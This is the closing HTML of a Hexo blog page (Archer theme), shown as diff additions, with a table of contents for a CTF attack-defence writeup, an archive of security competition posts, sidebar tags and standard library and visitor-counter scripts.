+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#广东强网杯AWD题目分析"><span class="toc-number">1.</span> <span class="toc-text">广东强网杯AWD题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web1-php"><span class="toc-number">1.1.</span> <span class="toc-text">web1 php</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞一-预置后门"><span class="toc-number">1.1.1.</span> <span class="toc-text">漏洞一 预置后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞一修复"><span class="toc-number">1.1.2.</span> <span class="toc-text">漏洞一修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞二-数据库注入"><span class="toc-number">1.1.3.</span> <span class="toc-text">漏洞二 数据库注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞二修复"><span class="toc-number">1.1.4.</span> <span class="toc-text">漏洞二修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞三-文件上传"><span class="toc-number">1.1.5.</span> <span class="toc-text">漏洞三 文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞三修复"><span class="toc-number">1.1.6.</span> <span class="toc-text">漏洞三修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web2-python"><span class="toc-number">1.2.</span> <span class="toc-text">web2 python</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞一-SSTI"><span class="toc-number">1.2.1.</span> <span class="toc-text">漏洞一 SSTI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞一-修复方法"><span class="toc-number">1.2.2.</span> <span class="toc-text">漏洞一 修复方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞二-预置后门"><span class="toc-number">1.2.3.</span> <span class="toc-text">漏洞二 预置后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞二-修复方法"><span class="toc-number">1.2.4.</span> <span class="toc-text">漏洞二 修复方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">1.3.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析"><span class="toc-number">1.3.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.3.2.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞修复"><span class="toc-number">1.3.3.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 24
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/10</span><a class="archive-post-title" href= "/2019/10/10/gdqwb-awd-writeup/" >广东强网杯AWD题目分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href= "/2019/09/05/jtwlb-ctf/" >JTWLB-CTF-Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/09</span><a class="archive-post-title" href= "/2019/06/09/powerpc/" >PowerPC栈溢出初探：从放弃到getshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href= "/2019/06/08/ddctf2019/" >ddctf2019-misc&web&re-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2019/05/31/UTCTF2019-pwn-writeup/" >UTCTF2019-pwn-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2019/05/31/tcahe-pwn/" >tcache在pwn题中常见的利用姿势</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2019/05/31/TAMUctf2019-pwn-writeup/" >TAMUctf2019-pwn-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2019/05/31/encryptCTF2019-web-pwn-writeup/" >encryptCTF2019-web&pwn-writeup</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/31</span><a class="archive-post-title" href= "/2018/12/31/2018-sola-photo/" >2018年飞机上拍的照片</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/20</span><a class="archive-post-title" href= "/2018/12/20/swpuctf2018/" >swpuctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2018/11/06/huwangbei-awd-pwn/" >首届护网杯AWD PWN题writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/29</span><a class="archive-post-title" href= "/2018/10/29/huwangbei-bookmanager/" >护网杯线下赛积分赛bookManager</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/20</span><a class="archive-post-title" href= "/2018/10/20/vnote/" >vnote+企鹅云打造你的个人笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/07</span><a class="archive-post-title" href= "/2018/09/07/wangdingbei/" >某比赛吐槽</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/11</span><a class="archive-post-title" href= "/2018/07/11/hitcontraining/" >Hitcon-Training-Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/01</span><a class="archive-post-title" href= "/2018/06/01/redhat2018-awd-pwn/" >红帽杯2018线下赛AWD PWN(更新格式化字符利用)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/02</span><a class="archive-post-title" href= "/2018/05/02/redhat2018/" >广东红帽杯2018 writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/16</span><a class="archive-post-title" href= "/2018/04/16/Python-is-the-best-language/" >Python-is-the-best-language</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/12</span><a class="archive-post-title" href= "/2018/04/12/qwb-pwn-opm/" >qwb-pwn-opm</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/12</span><a class="archive-post-title" href= "/2018/04/12/qwb-pwn-raisepig/" >qwb-pwn-raisepig</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/qwb-pwn-silent1&2/" >qwb-pwn-silent1&2</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/07</span><a class="archive-post-title" href= "/2018/02/07/Hgame-pwn/" >Hgame pwn</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/05</span><a class="archive-post-title" href= "/2018/02/05/HITCTF2018-writeup/" >HITCTF2018-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href= "/2018/01/30/pwn-imdb/" >pwn-imdb</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+        <span class="sidebar-tag-name" data-tags="awd"><span class="iconfont-archer">&#xe606;</span>awd</span>
+    
+        <span class="sidebar-tag-name" data-tags="杂"><span class="iconfont-archer">&#xe606;</span>杂</span>
+    
+        <span class="sidebar-tag-name" data-tags="吐槽"><span class="iconfont-archer">&#xe606;</span>吐槽</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "kira"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
